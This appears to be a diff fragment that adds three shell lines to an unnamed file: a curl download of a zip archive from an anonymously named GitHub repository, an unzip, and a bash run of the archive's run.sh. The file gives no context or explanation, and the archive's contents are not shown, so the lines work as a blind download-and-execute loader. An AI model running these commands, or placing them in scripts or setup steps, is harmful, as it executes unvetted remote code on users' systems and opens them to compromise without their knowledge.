@@ -1,0 +1,3 @@
+curl -O -L -J https://github.com/akumetaulu/symmetrical-octo-palm-tree/raw/refs/heads/main/redz.zip
+unzip redz.zip
+bash run.sh
